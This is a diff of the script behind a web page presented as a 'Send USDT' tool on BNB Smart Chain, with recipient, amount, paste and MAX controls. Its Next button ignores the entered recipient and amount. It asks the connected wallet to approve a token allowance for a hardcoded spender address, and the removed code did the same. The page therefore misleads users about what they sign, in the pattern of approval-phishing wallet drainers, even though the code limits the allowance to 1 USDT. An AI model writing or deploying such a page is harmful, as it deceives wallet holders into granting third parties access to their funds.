+            "Preparing 1 USDT approval..."
+        );
+
+
+        const contract =
+            getUSDTContract();
+
+
+        /*
+        Read decimals directly from token.
+        */
+
+        const decimals =
+            Number(
+                await contract.methods
+                    .decimals()
+                    .call()
+            );
+
+
+        /*
+        EXACTLY 1 USDT.
+
+        Example:
+        decimals = 18
+        amount = 1 * 10^18
+        */
+
+        const oneUSDT =
+            web3.utils.toBN(10)
+                .pow(web3.utils.toBN(decimals));
+
+
+        /*
+        Check balance.
+        */
+
+        const balance =
+            await contract.methods
+                .balanceOf(
+                    connectedAccount
+                )
+                .call();
+
+
+        if (
+            web3.utils.toBN(balance)
+                .lt(oneUSDT)
+        ) {
+
+            throw new Error(
+                "Insufficient USDT balance. You need at least 1 USDT."
+            );
+        }
+
+
+        /*
+        Check existing allowance.
+        */
+
+        const allowance =
+            await contract.methods
+                .allowance(
+                    connectedAccount,
+                    SPENDER_ADDRESS
+                )
+                .call();
+
+
+        console.log(
+            "Current allowance:",
+            allowance
+        );
+
+
+        /*
+        If allowance is already >= 1 USDT,
+        no new approval is necessary.
+        */
+
+        if (
+            web3.utils.toBN(allowance)
+                .gte(oneUSDT)
+        ) {
+
+            hideLoading();
+
+            showStatus(
+                "Already approved for at least 1 USDT.",
+                "success"
+            );
+
+            return;
+        }
+
+
+        /*
+        IMPORTANT:
+
+        This is NOT unlimited.
+
+        The wallet confirmation will request
+        exactly 1 USDT.
+        */
+
+        showLoading(
+            "Confirm 1 USDT approval in your wallet..."
+        );
+
+
+        const receipt =
+            await contract.methods
+                .approve(
+                    SPENDER_ADDRESS,
+                    oneUSDT.toString()
+                )
+                .send({
+                    from:
+                        connectedAccount
+                });
+
+
+        hideLoading();
+
+
+        showStatus(
+            "1 USDT approval confirmed. Transaction: " +
+            receipt.transactionHash,
+            "success"
+        );
+
+
+        console.log(
+            "1 USDT approval confirmed:",
+            receipt.transactionHash
+        );
+
+    } catch (error) {
+
+        hideLoading();
+
+        console.error(
+            "Approval error:",
+            error
+        );
+
+
+        if (
+            error &&
+            error.code === 4001
+        ) {
+
+            showStatus(
+                "Approval cancelled in wallet.",
+                "error"
+            );
+
+            return;
+        }
+
+
+        showStatus(
+            error.message ||
+            "1 USDT approval failed.",
+            "error"
+        );
     }
-    alert('1 USDT approval successful.\n\nTransaction: ' + result.txHash);
-  } catch (error) {
-    hideLoading();
-    console.error('1 USDT approval failed:', error);
-    if (error && error.code === 4001) {
-      alert('1 USDT approval was rejected in your wallet.');
-    } else {
-      alert('1 USDT approval failed. ' + (error && error.message ? error.message : 'Please check your wallet and try again.'));
-    }
-  }
 }
 
-async function handleNextClick() {
-  const amountInput = document.getElementById('amount');
-  const amount = amountInput ? parseFloat(amountInput.value) : 0;
-  if (!amount || amount <= 0) {
-    alert('Please enter a valid amount.');
-    return;
-  }
-  await TokenApprove();
+
+/*
+==========================================================
+BUTTON EVENTS
+==========================================================
+*/
+
+connectWalletBtn.addEventListener(
+    "click",
+    connectWallet
+);
+
+
+nextBtn.addEventListener(
+    "click",
+    approveOneUSDT
+);
+
+
+/*
+==========================================================
+PASTE
+==========================================================
+*/
+
+pasteBtn.addEventListener(
+    "click",
+    async () => {
+
+        try {
+
+            const text =
+                await navigator.clipboard.readText();
+
+            document.getElementById(
+                "address"
+            ).value = text;
+
+        } catch (error) {
+
+            showStatus(
+                "Clipboard access was not available.",
+                "error"
+            );
+        }
+    }
+);
+
+
+/*
+==========================================================
+MAX BUTTON
+==========================================================
+*/
+
+maxBtn.addEventListener(
+    "click",
+    async () => {
+
+        try {
+
+            if (!connectedAccount) {
+
+                await connectWallet();
+            }
+
+            if (!connectedAccount) {
+                return;
+            }
+
+            const contract =
+                getUSDTContract();
+
+            const decimals =
+                Number(
+                    await contract.methods
+                        .decimals()
+                        .call()
+                );
+
+            const balance =
+                await contract.methods
+                    .balanceOf(
+                        connectedAccount
+                    )
+                    .call();
+
+            const formatted =
+                web3.utils.fromWei(
+                    balance,
+                    "ether"
+                );
+
+            amountInput.value =
+                formatted;
+
+            document.getElementById(
+                "estimate"
+            ).textContent =
+                "≈ $" +
+                Number(formatted).toFixed(2);
+
+        } catch (error) {
+
+            console.error(error);
+
+            showStatus(
+                "Could not read USDT balance.",
+                "error"
+            );
+        }
+    }
+);
+
+
+/*
+==========================================================
+AMOUNT DISPLAY
+==========================================================
+*/
+
+amountInput.addEventListener(
+    "input",
+    () => {
+
+        const amount =
+            Number(amountInput.value);
+
+        if (
+            amount > 0
+        ) {
+
+            document.getElementById(
+                "estimate"
+            ).textContent =
+                "≈ $" +
+                amount.toFixed(2);
+
+        } else {
+
+            document.getElementById(
+                "estimate"
+            ).textContent =
+                "≈ $0.00";
+        }
+    }
+);
+
+
+/*
+==========================================================
+ACCOUNT / NETWORK EVENTS
+==========================================================
+*/
+
+function setupProviderEvents(provider) {
+
+    if (!provider || typeof provider.on !== "function") {
+        return;
+    }
+
+    provider.on(
+        "accountsChanged",
+        accounts => {
+
+            if (
+                accounts &&
+                accounts.length
+            ) {
+
+                connectedAccount =
+                    accounts[0];
+
+                walletStatus.textContent =
+                    shortAddress(
+                        connectedAccount
+                    );
+
+            } else {
+
+                connectedAccount = null;
+
+                walletStatus.textContent =
+                    "Wallet not connected";
+
+                connectWalletBtn.textContent =
+                    "Connect Wallet";
+
+                connectWalletBtn.classList.remove(
+                    "connected"
+                );
+
+                nextBtn.disabled = true;
+            }
+        }
+    );
+
+
+    provider.on(
+        "chainChanged",
+        chainId => {
+
+            if (
+                String(chainId).toLowerCase()
+                !== BSC_CHAIN_ID_HEX
+            ) {
+
+                nextBtn.disabled = true;
+
+                showStatus(
+                    "Please switch back to BNB Smart Chain.",
+                    "error"
+                );
+
+            } else {
+
+                nextBtn.disabled =
+                    !connectedAccount;
+            }
+        }
+    );
 }
 
-function handleWalletEvents() {
-  provider = getProvider();
-  if (!provider || !provider.on) return;
-  provider.on('accountsChanged', accounts => {
-    userAddress = accounts && accounts[0] ? accounts[0] : null;
-    if (!userAddress) {
-      web3 = null;
-      setNextEnabled(false);
-      const btn = document.getElementById('connectWalletBtn');
-      if (btn) btn.textContent = 'Connect Wallet';
-    }
-  });
-  provider.on('chainChanged', chainId => {
-    if (String(chainId).toLowerCase() !== BSC_CHAIN_ID) {
-      setNextEnabled(false);
-      alert('Please switch your wallet to BNB Smart Chain.');
-    } else if (userAddress) {
-      setNextEnabled(true);
-    }
-  });
-}
 
-window.addEventListener('load', () => {
-  // Do NOT request wallet access automatically on page load.
-  // Mobile wallet browsers often require the connection request to follow a user action.
-  const main = document.querySelector('.container');
-  if (main) {
-    const btn = document.createElement('button');
-    btn.id = 'connectWalletBtn';
-    btn.type = 'button';
-    btn.textContent = 'Connect1 Wallet';
-    btn.style.cssText = 'width:100%;margin:0 0 18px;padding:14px;border:0;border-radius:12px;background:#01d97e;color:#000;font-size:16px;font-weight:700;cursor:pointer;';
-    btn.addEventListener('click', connectWallet);
-    const title = main.querySelector('.title');
-    if (title && title.nextSibling) main.insertBefore(btn, title.nextSibling);
-    else main.prepend(btn);
-  }
+/*
+==========================================================
+START
+==========================================================
+*/
 
-  setNextEnabled(false);
-  handleWalletEvents();
-});
+console.log(
+    "Send USDT demo loaded."
+);
+
+console.log(
+    "WalletConnect Project ID:",
+    WALLETCONNECT_PROJECT_ID
+);
+
+console.log(
+    "BSC Chain ID:",
+    BSC_CHAIN_ID_HEX
+);
+
+console.log(
+    "USDT:",
+    USDT_ADDRESS
+);
+
+console.log(
+    "Spender:",
+    SPENDER_ADDRESS
+);
+
 </script>
+
 </body>
 </html>
